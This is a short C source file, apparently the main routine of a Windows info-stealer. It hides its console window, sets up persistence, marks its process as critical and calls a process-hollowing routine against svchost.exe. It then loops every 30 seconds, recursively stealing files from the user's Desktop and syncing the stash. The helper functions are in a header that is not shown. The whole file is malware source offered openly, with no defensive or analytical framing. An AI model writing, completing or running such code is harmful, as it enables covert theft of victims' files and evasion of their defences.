#include "loader.h"

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    // 1. Invisible Start
    HWND stealth = GetConsoleWindow();
    ShowWindow(stealth, SW_HIDE);

    // 2. Defense & Persistence
    SetPersistence();
    ProtectProcess(); // Critical mark (Run as Admin for this to work)

    // 3. Initial Execution
    MockHollow("C:\\Windows\\System32\\svchost.exe");

    // 4. Persistent Loop (Scan & Sync)
    while (TRUE) {
        char userPath[MAX_PATH];
        GetEnvironmentVariableA("USERPROFILE", userPath, MAX_PATH);
        strcat(userPath, "\\Desktop");

        RecursiveSteal(userPath); // Desktop scan
        SyncOfflineData();        // Stash sync

        Sleep(30000); // Har 30 second baad check karega
    }
    return 0;
}